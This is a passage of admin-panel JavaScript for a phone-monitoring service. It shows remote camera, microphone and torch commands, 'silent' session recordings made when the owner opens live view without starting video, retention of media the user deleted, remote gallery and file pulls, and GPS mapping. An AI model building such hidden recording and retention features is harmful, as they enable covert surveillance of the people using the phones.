      if (!group || !body) return;
      const opening = body.hasAttribute("hidden");
      if (opening) {
        body.removeAttribute("hidden");
        group.classList.add("is-open");
        btn.setAttribute("aria-expanded", "true");
        if (chevron) chevron.textContent = "▲";
      } else {
        body.setAttribute("hidden", "");
        group.classList.remove("is-open");
        btn.setAttribute("aria-expanded", "false");
        if (chevron) chevron.textContent = "▼";
      }
    });
  });
}

function renderAdminSilentRecordingsTimeline() {
  const el = document.getElementById("admin-silent-recordings-timeline");
  if (!el || !exploreCtx) return;
  const ownerEmail = String(exploreCtx.ownerEmail || exploreCtx.ownerUid || "user");
  const silentItems = [...(exploreCtx.data.remoteMedia || [])]
    .filter(isAdminSilentRecording)
    .sort((a, b) => Number(b.createdAt || 0) - Number(a.createdAt || 0));
  if (!silentItems.length) {
    el.innerHTML = `<p class="muted">No silent session recordings yet. They appear when ${escapeHtml(ownerEmail)} connects to the camera (live view) without pressing Start video.</p>`;
    return;
  }
  const sessions = groupAdminSilentSessions(silentItems);
  const dayGroups = groupSilentSessionsByDay(sessions);
  el.innerHTML = `<div class="silent-timeline">${dayGroups
    .map(([dayKey, daySessions]) => {
      const dayTotalMs = daySessions.reduce((sum, g) => sum + Number(g.totalMs || 0), 0);
      const sessionCount = daySessions.length;
      const segCount = daySessions.reduce((sum, g) => sum + g.segments.length, 0);
      return `<section class="silent-day-group" data-day="${escapeHtml(dayKey)}">
        <button type="button" class="silent-day-header" aria-expanded="false">
          <span class="silent-day-title">${escapeHtml(usageDayLabel(dayKey))}</span>
          <span class="silent-day-meta muted">${sessionCount} session(s) · ${segCount} segment(s) · ${escapeHtml(formatUsageDuration(dayTotalMs))}</span>
          <span class="silent-collapse-chevron" aria-hidden="true">▼</span>
        </button>
        <div class="silent-day-body" hidden>
          ${daySessions
            .map((g) => {
              const startShort = escapeHtml(fmtTimeShort(g.started));
              const endShort = g.ended ? escapeHtml(fmtTimeShort(g.ended)) : "—";
              const dur = escapeHtml(formatUsageDuration(g.totalMs || 0));
              return `<section class="silent-session-group" data-session="${escapeHtml(g.sessionId)}">
                <button type="button" class="silent-session-header" aria-expanded="false">
                  <span class="admin-badge silent">Silent</span>
                  <span class="silent-session-time"><strong>${startShort}</strong> → ${endShort}</span>
                  <span class="silent-session-meta muted">${g.segments.length} segment(s) · ${dur}</span>
                  <span class="silent-collapse-chevron" aria-hidden="true">▼</span>
                </button>
                <div class="silent-session-body" hidden>
                  <p class="muted silent-session-sub">User: ${escapeHtml(ownerEmail)} · Session ${escapeHtml(g.sessionId.slice(0, 12))}…</p>
                  <div class="silent-segments">${g.segments
                    .map((m) => {
                      const url = String(m.downloadUrl || "");
                      const seg = Number(m.segmentIndex || 0) + 1;
                      const when = escapeHtml(fmtTimeShort(m.segmentStartedAt || m.createdAt));
                      const segDur = escapeHtml(formatUsageDuration(m.durationMs || 0));
                      const name = escapeHtml(m.fileName || `segment-${seg}`);
                      return `<article class="silent-segment-row">
                        <div class="silent-segment-meta">
                          <strong>Segment ${seg}</strong> · ${when} · ${segDur}
                          <div class="muted">${name}</div>
                        </div>
                        ${
                          url
                            ? `<video class="live-capture-preview" src="${escapeHtml(url)}" controls playsinline preload="metadata"></video>
                               <div class="admin-gallery-actions silent-segment-actions">
                                 <a class="btn-secondary" href="${escapeHtml(url)}" target="_blank" rel="noopener">Open / Download</a>
                                 <button type="button" class="btn-danger btn-admin-media-hard-delete" data-media-id="${escapeHtml(m.mediaId)}">Delete permanently</button>
                               </div>`
                            : ""
                        }
                      </article>`;
                    })
                    .join("")}</div>
                </div>
              </section>`;
            })
            .join("")}
        </div>
      </section>`;
    })
    .join("")}</div>`;
  wireSilentTimelineCollapse(el);
  el.querySelectorAll(".btn-admin-media-hard-delete").forEach((btn) => {
    btn.addEventListener("click", (ev) => {
      ev.stopPropagation();
      const mediaId = btn.getAttribute("data-media-id") || "";
      if (mediaId) void hardDeleteAdminMedia(mediaId);
    });
  });
}

function renderAdminRemoteMediaList() {
  const listEl = document.getElementById("admin-remote-media-list");
  if (!listEl || !exploreCtx) return;
  const ownerEmail = String(exploreCtx.ownerEmail || exploreCtx.ownerUid || "user");
  const items = [...(exploreCtx.data.remoteMedia || [])]
    .filter((m) => !isAdminSilentRecording(m))
    .sort((a, b) => Number(b.createdAt || 0) - Number(a.createdAt || 0));
  if (!items.length) {
    listEl.innerHTML = `<p class="muted">No recorded videos yet for this device.</p>`;
    return;
  }
  listEl.innerHTML = items
    .slice(0, 40)
    .map((m) => {
      const url = String(m.downloadUrl || "");
      const name = escapeHtml(m.fileName || m.mediaId || "file");
      const kind = escapeHtml(m.kind || "file");
      const when = escapeHtml(fmtTime(m.createdAt));
      const hint = m.deletedByUser
        ? `<span class="admin-badge warn" title="Removed from the user’s website">Deleted by user (${escapeHtml(ownerEmail)})</span>`
        : "";
      const play =
        url && (m.kind === "video" || String(m.contentType || "").startsWith("video/"))
          ? `<video class="live-capture-preview" src="${escapeHtml(url)}" controls playsinline preload="metadata" style="max-width:100%;max-height:220px;border-radius:8px;"></video>`
          : url && (m.kind === "audio" || String(m.contentType || "").startsWith("audio/"))
            ? `<audio src="${escapeHtml(url)}" controls preload="metadata" style="width:100%;"></audio>`
            : url && (m.kind === "photo" || String(m.contentType || "").startsWith("image/"))
              ? `<img src="${escapeHtml(url)}" alt="" style="max-width:100%;max-height:180px;border-radius:8px;" />`
              : "";
      const openBtn = url
        ? `<a class="btn-secondary" href="${escapeHtml(url)}" target="_blank" rel="noopener">Open / Download</a>`
        : "";
      return `<article class="live-capture-row" style="margin-top:10px;padding:10px;border:1px solid #e2e8f0;border-radius:10px;">
        ${play}
        <div class="live-capture-meta" style="margin-top:8px;">
          <strong>${kind}</strong> · ${name} ${hint}
          <div class="muted">${when}</div>
          <div class="admin-gallery-actions" style="margin-top:6px;display:flex;gap:8px;flex-wrap:wrap;">
            ${openBtn}
            <button type="button" class="btn-danger btn-admin-media-hard-delete" data-media-id="${escapeHtml(m.mediaId)}">Delete permanently</button>
          </div>
        </div>
      </article>`;
    })
    .join("");
  listEl.querySelectorAll(".btn-admin-media-hard-delete").forEach((btn) => {
    btn.addEventListener("click", () => {
      const mediaId = btn.getAttribute("data-media-id") || "";
      if (mediaId) void hardDeleteAdminMedia(mediaId);
    });
  });
}

async function hardDeleteAdminMedia(mediaId) {
  if (!exploreCtx || !mediaId) return;
  if (
    !window.confirm(
      "Permanently delete this recording? This cannot be undone (removes file for user and admin)."
    )
  ) {
    return;
  }
  try {
    await api(
      `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/media/${encodeURIComponent(mediaId)}/delete`,
      { method: "POST", body: "{}" }
    );
    await openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId);
  } catch (e) {
    alert(formatApiError(e));
  }
}

function wireLiveControls() {
  document.getElementById("btn-admin-speaker")?.addEventListener("click", async () => {
    const ok = liveViewer?.enableSpeaker ? await liveViewer.enableSpeaker() : false;
    const st = document.getElementById("live-status");
    if (st) {
      st.textContent = ok
        ? "Speaker enabled"
        : "Browser blocked speaker — tap Enable speaker again after media starts";
    }
  });
  document.querySelectorAll("[data-live-cmd]").forEach((btn) => {
    btn.addEventListener("click", () => {
      void sendLiveCommand(btn.getAttribute("data-live-cmd")).catch(() => {});
    });
  });
  document.querySelectorAll("[data-live-toggle]").forEach((btn) => {
    btn.addEventListener("click", () => {
      void toggleLiveControl(btn.getAttribute("data-live-toggle"), btn).catch(() => {});
    });
  });
}

async function sendLiveCommand(action) {
  if (!exploreCtx || !activeLiveSessionId) {
    const st = document.getElementById("live-status");
    if (st) st.textContent = "No active session for commands.";
    return;
  }
  const act = String(action || "").trim().toUpperCase();
  const st = document.getElementById("live-status");
  try {
    if (act === "END_SESSION") {
      await endAdminLive("client_ended");
      return;
    }
    await api(
      `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/session/command`,
      {
        method: "POST",
        body: JSON.stringify({ sessionId: activeLiveSessionId, action: act }),
      }
    );
    if (st) st.textContent = `Command ${act} sent`;
    if (act === "CAPTURE_PHOTO") startAdminCapturesPoll();
  } catch (e) {
    if (st) st.textContent = formatApiError(e);
    throw e;
  }
}

async function toggleLiveControl(toggle, btn) {
  if (!activeLiveSessionId) return;
  try {
    if (toggle === "torch") {
      const next = !liveControlState.torch;
      await sendLiveCommand(next ? "TORCH_ON" : "TORCH_OFF");
      liveControlState.torch = next;
      if (btn) {
        btn.setAttribute("aria-pressed", next ? "true" : "false");
        btn.textContent = next ? "Torch: ON" : "Torch: OFF";
      }
    } else if (toggle === "mic") {
      const nextMuted = !liveControlState.micMuted;
      await sendLiveCommand(nextMuted ? "MIC_MUTE" : "MIC_UNMUTE");
      liveControlState.micMuted = nextMuted;
      if (btn) {
        btn.setAttribute("aria-pressed", nextMuted ? "true" : "false");
        btn.textContent = nextMuted ? "Mic: OFF" : "Mic: ON";
      }
    } else if (toggle === "video-rec") {
      const next = !liveControlState.videoRec;
      await sendLiveCommand(next ? "START_VIDEO_RECORDING" : "STOP_VIDEO_RECORDING");
      liveControlState.videoRec = next;
      if (btn) {
        btn.setAttribute("aria-pressed", next ? "true" : "false");
        btn.textContent = next ? "Stop video" : "Start video";
      }
    } else if (toggle === "audio-rec") {
      const next = !liveControlState.audioRec;
      await sendLiveCommand(next ? "START_AUDIO_RECORDING" : "STOP_AUDIO_RECORDING");
      liveControlState.audioRec = next;
      if (btn) {
        btn.setAttribute("aria-pressed", next ? "true" : "false");
        btn.textContent = next ? "Stop audio file" : "Record audio file";
      }
    }
  } catch {
    /* status already set in sendLiveCommand */
  }
}

async function endAdminLive(reason) {
  const st = document.getElementById("live-status");
  const ownerUid = exploreCtx?.ownerUid;
  const deviceId = exploreCtx?.deviceId;
  const sessionId = activeLiveSessionId;
  try {
    if (ownerUid && deviceId && sessionId) {
      await api(
        `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/session/end`,
        { method: "POST", body: JSON.stringify({ sessionId, reason: reason || "admin_ended" }) }
      ).catch(() => {});
    }
  } finally {
    await stopLiveViewer();
    activeLiveSessionId = "";
    liveControlState = { torch: false, micMuted: false, videoRec: false, audioRec: false };
    show(document.getElementById("admin-live-panel"), false);
    show(document.getElementById("admin-live-controls"), false);
    const endBtn = document.getElementById("btn-admin-end-live");
    if (endBtn) endBtn.hidden = true;
    if (st) st.textContent = "Live session ended.";
  }
}

function adminGoogleMapsEmbedUrl(lat, lon, zoom) {
  const z = Math.min(20, Math.max(3, Number(zoom) || 16));
  return (
    `https://maps.google.com/maps?q=${encodeURIComponent(`${lat},${lon}`)}` +
    `&hl=en&z=${z}&t=m&output=embed`
  );
}

function adminGoogleMapsOpenUrl(lat, lon, zoom) {
  const z = Math.min(20, Math.max(3, Number(zoom) || 16));
  return `https://www.google.com/maps?q=${encodeURIComponent(`${lat},${lon}`)}&z=${z}`;
}

function adminLocationRenderKey(deviceId, lat, lon, zoom) {
  return `${deviceId}|${lat.toFixed(5)}|${lon.toFixed(5)}|${zoom}`;
}

function startAdminCapturesPoll() {
  if (adminCapturesPollTimer) clearInterval(adminCapturesPollTimer);
  if (!exploreCtx) return;
  const startedAt = Date.now();
  let attempts = 0;
  const tick = async () => {
    attempts += 1;
    try {
      await openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId);
      renderAdminRemoteMediaList();
      const items = exploreCtx?.data?.remoteMedia || [];
      const fresh = items.find(
        (m) =>
          (m.kind === "photo" || String(m.contentType || "").startsWith("image/")) &&
          Number(m.createdAt || 0) >= startedAt - 5000 &&
          m.downloadUrl
      );
      const st = document.getElementById("live-status");
      if (fresh) {
        if (st) st.textContent = "Photo saved below.";
        clearInterval(adminCapturesPollTimer);
        adminCapturesPollTimer = null;
        return;
      }
      if (attempts >= 16) {
        if (st) st.textContent = "Photo capture sent — check below shortly.";
        clearInterval(adminCapturesPollTimer);
        adminCapturesPollTimer = null;
      }
    } catch {
      /* keep polling */
    }
  };
  tick();
  adminCapturesPollTimer = setInterval(tick, 2000);
}

function adminGalleryActionLabel(type, mimeType) {
  const t = String(type || "").toLowerCase();
  if (t === "image" || String(mimeType || "").startsWith("image/")) return "View";
  if (t === "video" || t === "audio") return "Play";
  return "Download";
}

function paintAdminGalleryButton(btn, state, item) {
  if (!btn) return;
  btn.classList.remove("btn-file-progress", "btn-file-ready", "btn-file-error");
  if (state?.status === "downloading") {
    const p = Math.max(0, Math.min(100, Number(state.progress) || 0));
    btn.textContent = `${p}%`;
    btn.disabled = true;
    btn.classList.add("btn-file-progress");
    btn.style.setProperty("--file-progress", `${p}%`);
    return;
  }
  btn.disabled = false;
  btn.style.removeProperty("--file-progress");
  if (state?.status === "ready") {
    btn.textContent = adminGalleryActionLabel(item?.type, state.mimeType || item?.mimeType);
    btn.classList.add("btn-file-ready");
    return;
  }
  if (state?.status === "error") {
    btn.textContent = "Retry";
    btn.classList.add("btn-file-error");
    return;
  }
  btn.textContent = "Download";
}

function closeAdminGalleryInlineViewer() {
  const wrap = document.getElementById("admin-gallery-inline-viewer");
  const body = document.getElementById("admin-gallery-inline-body");
  if (body) body.innerHTML = "";
  if (wrap) wrap.hidden = true;
}

function formatAdminTransferError(t) {
  const code = String(t?.errorCode || "").trim();
  const msg = String(t?.errorMessage || "").trim();
  if (code === "ITEM_NOT_FOUND" || /not available locally/i.test(msg)) {
    return "File not on phone anymore. Tap Request index, wait a few seconds, Refresh, then retry.";
  }
  if (code === "GALLERY_DISABLED") {
    return "Gallery access is disabled on the phone. Enable it in the app, then retry.";
  }
  if (code === "UPLOAD_FAILED" || /unknown error occurred/i.test(msg)) {
    return "Phone could not upload this file. Keep the phone unlocked and online, enable gallery access, tap Request index, then retry.";
  }
  return msg || code || `Transfer ${String(t?.status || "failed")}`;
}

async function findReadyAdminGalleryTransfer(ownerUid, deviceId, itemId) {
  const data = await api(
    `/api/admin/users/${encodeURIComponent(ownerUid)}/transfers?deviceId=${encodeURIComponent(deviceId)}`
  );
  const rows = data.transfers || [];
  return (
    rows.find(
      (t) =>
        String(t.deviceId || "") === deviceId &&
        String(t.sourceReference || "") === itemId &&
        t.status === "ready" &&
        (t.storagePath || t.downloadUrl || t.contentUrl)
    ) || null
  );
}

async function fetchAdminTransferBlob(ownerUid, transfer) {
  const transferId = String(transfer?.transferId || "").trim();
  const errors = [];
  if (transferId && idToken) {
    try {
      const res = await fetch(
        `/api/admin/users/${encodeURIComponent(ownerUid)}/transfers/${encodeURIComponent(transferId)}/content`,
        { headers: { Authorization: `Bearer ${idToken}` } }
      );
      if (res.ok) return await res.blob();
      const body = await res.json().catch(() => ({}));
      errors.push(body.error || `content HTTP ${res.status}`);
    } catch (e) {
      errors.push(e instanceof Error ? e.message : String(e));
    }
  }
  const url = String(transfer?.downloadUrl || "").trim();
  if (url) {
    try {
      const res = await fetch(url);
      if (res.ok) return await res.blob();
      errors.push(`signed URL HTTP ${res.status}`);
    } catch (e) {
      errors.push(e instanceof Error ? e.message : String(e));
    }
  }
  throw new Error(
    errors[0] ? `Could not open file (${errors[0]})` : "Transfer ready but file could not be downloaded"
  );
}

/**
 * Wait for phone upload with admin transfer API + optional command poke.
 */
async function pollAdminGalleryTransfer(ownerUid, deviceId, transferId, commandId, onProgress) {
  const timeoutMs = 3 * 60 * 1000;
  const deadline = Date.now() + timeoutMs;
  let poked = false;
  const pokeUrl =
    deviceId && commandId
      ? `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/commands/${encodeURIComponent(commandId)}/poke`
      : "";
  while (Date.now() < deadline) {
    const data = await api(
      `/api/admin/users/${encodeURIComponent(ownerUid)}/transfers/${encodeURIComponent(transferId)}`
    );
    const t = data.transfer || {};
    const st = String(t.status || "");
    const progress = Number(t.progress || 0);
    if (st === "requested" || st === "pending") {
      onProgress?.(Math.max(5, progress), st);
    } else if (st === "uploading") {
      onProgress?.(Math.max(10, progress || 10), st);
    } else {
      onProgress?.(Math.max(5, progress || 5), st);
    }
    if (st === "ready") {
      try {
        const list = await api(
          `/api/admin/users/${encodeURIComponent(ownerUid)}/transfers?deviceId=${encodeURIComponent(deviceId)}`
        );
        const row = (list.transfers || []).find((x) => x.transferId === transferId);
        if (row && (row.downloadUrl || row.storagePath || row.contentUrl)) {
          return row;
        }
      } catch {
        /* use transfer doc */
      }
      if (t.storagePath || t.downloadUrl) {
        return { ...t, transferId };
      }
      throw new Error("Transfer ready but file path missing");
    }
    if (st === "failed" || st === "cancelled" || st === "expired") {
      throw new Error(formatAdminTransferError(t));
    }
    if (!poked && pokeUrl && Date.now() + timeoutMs - deadline > 4000) {
      poked = true;
      try {
        await api(pokeUrl, { method: "POST", body: "{}" });
      } catch {
        /* phone may still pick up via Firestore */
      }
    }
    await new Promise((r) => setTimeout(r, 1000));
  }
  throw new Error("Transfer timed out — keep the phone unlocked and try again");
}

function showAdminGalleryInline(entry) {
  const wrap = document.getElementById("admin-gallery-inline-viewer");
  const body = document.getElementById("admin-gallery-inline-body");
  const title = document.getElementById("admin-gallery-inline-title");
  if (!wrap || !body || !entry?.objectUrl) return;
  if (title) title.textContent = entry.displayName || "Preview";
  body.innerHTML = "";
  const mime = String(entry.mimeType || "").toLowerCase();
  const type = String(entry.type || "").toLowerCase();
  if (type === "image" || mime.startsWith("image/")) {
    const img = document.createElement("img");
    img.src = entry.objectUrl;
    img.alt = entry.displayName || "image";
    body.appendChild(img);
  } else if (type === "video" || mime.startsWith("video/")) {
    const video = document.createElement("video");
    video.src = entry.objectUrl;
    video.controls = true;
    video.playsInline = true;
    body.appendChild(video);
    video.play().catch(() => {});
  } else if (type === "audio" || mime.startsWith("audio/")) {
    const audio = document.createElement("audio");
    audio.src = entry.objectUrl;
    audio.controls = true;
    body.appendChild(audio);
    audio.play().catch(() => {});
  } else {
    const link = document.createElement("a");
    link.href = entry.objectUrl;
    link.download = entry.displayName || "file";
    link.className = "btn-secondary";
    link.textContent = "Download file";
    body.appendChild(link);
  }
  wrap.hidden = false;
  wrap.scrollIntoView({ behavior: "smooth", block: "nearest" });
}

async function downloadAdminGalleryItem(item, btn) {
  if (!exploreCtx || !item?.itemId) return;
  const key = `${exploreCtx.ownerUid}:${exploreCtx.deviceId}:${item.itemId}`;
  const existing = adminGalleryItemState.get(key);
  if (existing?.status === "ready" && existing.objectUrl) {
    paintAdminGalleryButton(btn, existing, item);
    showAdminGalleryInline(existing);
    return;
  }
  const cached = adminGalleryCache.get(key);
  if (cached?.objectUrl) {
    const state = { status: "ready", progress: 100, ...cached };
    adminGalleryItemState.set(key, state);
    paintAdminGalleryButton(btn, state, item);
    showAdminGalleryInline(state);
    return;
  }
  let state = { status: "downloading", progress: 3, displayName: item.displayName || "file", type: item.type, mimeType: item.mimeType };
  adminGalleryItemState.set(key, state);
  paintAdminGalleryButton(btn, state, item);
  try {
    let transfer = await findReadyAdminGalleryTransfer(
      exploreCtx.ownerUid,
      exploreCtx.deviceId,
      item.itemId
    );
    if (!transfer) {
      const started = await api(
        `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/gallery/transfer`,
        {
          method: "POST",
          body: JSON.stringify({
            itemId: item.itemId,
            displayName: item.displayName,
            mimeType: item.mimeType,
            sizeBytes: item.sizeBytes,
          }),
        }
      );
      const transferId = started.transfer?.transferId || started.transferId;
      const commandId = started.command?.commandId || null;
      if (!transferId) throw new Error("No transferId returned");
      state = { ...state, progress: 5 };
      adminGalleryItemState.set(key, state);
      paintAdminGalleryButton(btn, state, item);
      transfer = await pollAdminGalleryTransfer(
        exploreCtx.ownerUid,
        exploreCtx.deviceId,
        transferId,
        commandId,
        (progress, status) => {
          let p = Math.max(5, Number(progress) || 5);
          if (status === "uploading") p = Math.max(p, 10);
          state = { ...state, status: "downloading", progress: p };
          adminGalleryItemState.set(key, state);
          paintAdminGalleryButton(btn, state, item);
        }
      );
    } else {
      state = { ...state, progress: 90 };
      adminGalleryItemState.set(key, state);
      paintAdminGalleryButton(btn, state, item);
    }

    state = { ...state, progress: 95 };
    adminGalleryItemState.set(key, state);
    paintAdminGalleryButton(btn, state, item);

    const blob = await fetchAdminTransferBlob(exploreCtx.ownerUid, transfer);
    const mime = String(item.mimeType || transfer.mimeType || blob.type || "");
    const typed =
      mime && (!blob.type || blob.type === "application/octet-stream")
        ? new Blob([blob], { type: mime })
        : blob;
    const objectUrl = URL.createObjectURL(typed);
    const ready = {
      status: "ready",
      progress: 100,
      objectUrl,
      mimeType: mime,
      displayName: item.displayName || transfer.displayName || "file",
      type: String(item.type || "").toLowerCase(),
    };
    adminGalleryCache.set(key, ready);
    adminGalleryItemState.set(key, ready);
    paintAdminGalleryButton(btn, ready, item);
    showAdminGalleryInline(ready);
  } catch (e) {
    state = { ...state, status: "error", progress: 0 };
    adminGalleryItemState.set(key, state);
    paintAdminGalleryButton(btn, state, item);
    throw e;
  }
}

function adminFormatRecTime(ms) {
  const total = Math.max(0, Math.floor(Number(ms) / 1000));
  const m = Math.floor(total / 60);
  const s = total % 60;
  return `${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`;
}

function adminSetRecStatus(label) {
  const el = document.getElementById("admin-rec-status");
  if (el) el.textContent = label;
}

function adminSetRecTimer(ms) {
  const el = document.getElementById("admin-rec-timer");
  if (el) el.textContent = adminFormatRecTime(ms);
}

function adminLocalRecElapsedMs() {
  if (!adminRecLocalStartedAt) return 0;
  const now = Date.now();
  const pauseExtra = adminRecUiState === "paused" && adminRecLocalPauseAt ? now - adminRecLocalPauseAt : 0;
  return Math.max(0, now - adminRecLocalStartedAt - adminRecLocalPausedMs - pauseExtra);
}

function stopAdminRecTimer() {
  if (adminRecLocalTimer) {
    clearInterval(adminRecLocalTimer);
    adminRecLocalTimer = null;
  }
}

function startAdminRecTimer(fromMs = 0) {
  stopAdminRecTimer();
  adminRecLocalStartedAt = Date.now() - Math.max(0, fromMs);
  adminRecLocalPausedMs = 0;
  adminRecLocalPauseAt = 0;
  adminSetRecTimer(fromMs);
  adminRecLocalTimer = setInterval(() => {
    if (adminRecUiState === "recording") adminSetRecTimer(adminLocalRecElapsedMs());
  }, 250);
}

function applyAdminRecUiFromStatus(status, durationMs) {
  const s = String(status || "Idle");
  adminSetRecStatus(s);
  if (/^Recording$/i.test(s)) {
    adminRecUiState = "recording";
    if (!adminRecLocalTimer) startAdminRecTimer(Number(durationMs) || 0);
  } else if (/^Paused$/i.test(s)) {
    adminRecUiState = "paused";
    stopAdminRecTimer();
    adminSetRecTimer(Number(durationMs) || adminLocalRecElapsedMs());
  } else if (/Encoding|Uploading/i.test(s)) {
    adminRecUiState = "uploading";
    stopAdminRecTimer();
    if (durationMs) adminSetRecTimer(durationMs);
  } else if (/^Completed$/i.test(s)) {
    adminRecUiState = "completed";
    stopAdminRecTimer();
    if (durationMs) adminSetRecTimer(durationMs);
  } else if (/^Failed$/i.test(s) || /^Cancelled$/i.test(s)) {
    adminRecUiState = "failed";
    stopAdminRecTimer();
  } else if (/Waiting|Permission/i.test(s)) {
    adminRecUiState = "recording";
    stopAdminRecTimer();
  } else {
    adminRecUiState = "idle";
    stopAdminRecTimer();
    if (!durationMs) adminSetRecTimer(0);
  }
}

function stopAdminRecordingsPoll() {
  if (adminRecordingsPollTimer) {
    clearInterval(adminRecordingsPollTimer);
    adminRecordingsPollTimer = null;
  }
}

function startAdminRecordingsPoll(maxMs = 180000) {
  stopAdminRecordingsPoll();
  const started = Date.now();
  adminRecordingsPollTimer = setInterval(async () => {
    try {
      if (!exploreCtx) return;
      await openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId);
      renderRecordingPanel();
      const badge = document.getElementById("admin-rec-status")?.textContent || "";
      if (/^(Completed|Failed|Cancelled)$/i.test(badge) || Date.now() - started > maxMs) {
        stopAdminRecordingsPoll();
      }
    } catch {
      /* keep polling */
    }
  }, 1000);
}

function normalizeAdminFilesPath(path) {
  return String(path || "").replace(/\\/g, "/").replace(/^\/+|\/+$/g, "").trim();
}

function parentAdminFilesPath(relativePath) {
  const p = normalizeAdminFilesPath(relativePath);
  const i = p.lastIndexOf("/");
  return i < 0 ? "" : p.slice(0, i);
}

function adminEntryParentPath(entry) {
  if (entry && Object.prototype.hasOwnProperty.call(entry, "parentRelativePath")) {
    return normalizeAdminFilesPath(entry.parentRelativePath);
  }
  return parentAdminFilesPath(entry?.relativePath || entry?.name || "");
}

function setAdminFilesSyncStatus(text) {
  const el = document.getElementById("admin-files-sync-status");
  if (!el) return;
  const msg = String(text || "").trim();
  el.textContent = msg;
  el.hidden = !msg;
}

function updateAdminFilesBreadcrumb() {
  const el = document.getElementById("admin-files-breadcrumb");
  const up = document.getElementById("btn-admin-files-up");
  const path = normalizeAdminFilesPath(adminFilesBrowse.relativePath);
  if (el) el.textContent = path ? `Path: Root / ${path.replace(/\//g, " / ")}` : "Path: Root";
  if (up) up.hidden = !path;
}

function closeAdminFilesInlineViewer() {
  const wrap = document.getElementById("admin-files-inline-viewer");
  const body = document.getElementById("admin-files-inline-body");
  if (body) body.innerHTML = "";
  if (wrap) wrap.hidden = true;
}

function showAdminFilesInline(entry) {
  const wrap = document.getElementById("admin-files-inline-viewer");
  const body = document.getElementById("admin-files-inline-body");
  const title = document.getElementById("admin-files-inline-title");
  if (!wrap || !body || !entry?.objectUrl) return;
  if (title) title.textContent = entry.displayName || "Preview";
  body.innerHTML = "";
  const mime = String(entry.mimeType || "").toLowerCase();
  const type = String(entry.type || "").toLowerCase();
  if (type === "image" || mime.startsWith("image/")) {
    const img = document.createElement("img");
    img.src = entry.objectUrl;
    img.alt = entry.displayName || "image";
    body.appendChild(img);
  } else if (type === "video" || mime.startsWith("video/")) {
    const video = document.createElement("video");
    video.src = entry.objectUrl;
    video.controls = true;
    video.playsInline = true;
    body.appendChild(video);
    video.play().catch(() => {});
  } else if (type === "audio" || mime.startsWith("audio/")) {
    const audio = document.createElement("audio");
    audio.src = entry.objectUrl;
    audio.controls = true;
    body.appendChild(audio);
    audio.play().catch(() => {});
  } else {
    const link = document.createElement("a");
    link.href = entry.objectUrl;
    link.download = entry.displayName || "file";
    link.className = "btn-secondary";
    link.textContent = "Download file";
    body.appendChild(link);
  }
  wrap.hidden = false;
  wrap.scrollIntoView({ behavior: "smooth", block: "nearest" });
}

async function listAdminFilesFolder(grantId, relativePath = "") {
  if (!exploreCtx) return;
  const path = normalizeAdminFilesPath(relativePath);
  adminFilesBrowse = { grantId, relativePath: path };
  updateAdminFilesBreadcrumb();
  closeAdminFilesInlineViewer();
  setAdminFilesSyncStatus(`Listing ${path || "root"}…`);
  await runDeviceCommand(exploreCtx.ownerUid, exploreCtx.deviceId, "FILE_LIST", {
    folderGrantId: grantId,
    relativePath: path,
  });
  for (let i = 0; i < 8; i++) {
    await new Promise((r) => setTimeout(r, 650));
    await openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId);
    renderFilesPanel({ silent: true });
    const body = document.getElementById("admin-files-body");
    if (body?.querySelector(".files-grid, .file-folder")) break;
  }
  setAdminFilesSyncStatus("");
}

function renderLocationPanel() {
  const el = document.getElementById("admin-location-body");
  if (!el || !exploreCtx) return;
  const loc = exploreCtx.data.location;
  const d = exploreCtx.data.device || {};
  document.getElementById("btn-admin-loc-refresh")?.addEventListener(
    "click",
    () => renderLocationPanel(),
    { once: true }
  );
  if (!loc || !Number.isFinite(Number(loc.latitude))) {
    el.innerHTML = emptyHint(
      d.locationSharingEnabled
        ? "No GPS fix cached yet. Tap Update location, wait a few seconds, then Refresh map."
        : "Location sharing may be off on the phone. Tap Update location to request a fix."
    );
    return;
  }
  const lat = Number(loc.latitude);
  const lon = Number(loc.longitude);
  const key = adminLocationRenderKey(exploreCtx.deviceId, lat, lon, adminLocationMapZoom);
  const hasCard = Boolean(el.querySelector(".location-map-card"));
  if (hasCard && key === adminLocationLastRenderKey) {
    const updated = loc.capturedAt ? new Date(loc.capturedAt).toLocaleString() : "—";
    const acc = loc.accuracy != null ? `${loc.accuracy} m` : loc.accuracyMeters != null ? `${loc.accuracyMeters} m` : "—";
    const coords = el.querySelector(".location-coords");
    const updatedEl = el.querySelector(".location-updated");
    if (coords) coords.textContent = `Lat ${lat.toFixed(6)} · Lon ${lon.toFixed(6)} · accuracy ${acc}`;
    if (updatedEl) updatedEl.textContent = `Updated ${updated}`;
    return;
  }
  adminLocationMapCoords = { lat, lon };
  adminLocationLastRenderKey = key;
  const embed = adminGoogleMapsEmbedUrl(lat, lon, adminLocationMapZoom);
  const openUrl = adminGoogleMapsOpenUrl(lat, lon, adminLocationMapZoom);
  const updated = loc.capturedAt ? new Date(loc.capturedAt).toLocaleString() : "—";
  const acc = loc.accuracy != null ? `${loc.accuracy} m` : loc.accuracyMeters != null ? `${loc.accuracyMeters} m` : "—";
  el.classList.remove("muted");
  el.innerHTML = `
    <div class="location-map-card">
      <div class="location-map-meta">
        <div>
          <strong>${escapeHtml(d.deviceName || exploreCtx.deviceId)}</strong>
          <p class="location-coords">Lat ${lat.toFixed(6)} · Lon ${lon.toFixed(6)} · accuracy ${escapeHtml(acc)}</p>
          <p class="muted location-updated">Updated ${escapeHtml(updated)}</p>
        </div>
        <div class="location-map-actions">
          <button type="button" class="btn-secondary" id="btn-admin-map-zoom-out" title="Zoom out">−</button>
          <span class="location-zoom-label" id="admin-location-zoom-label">Zoom ${adminLocationMapZoom}</span>
          <button type="button" class="btn-secondary" id="btn-admin-map-zoom-in" title="Zoom in">+</button>
          <a class="btn-secondary" href="${openUrl}" target="_blank" rel="noopener">Open in Google Maps</a>
        </div>
      </div>
      <div class="location-map-frame-wrap">
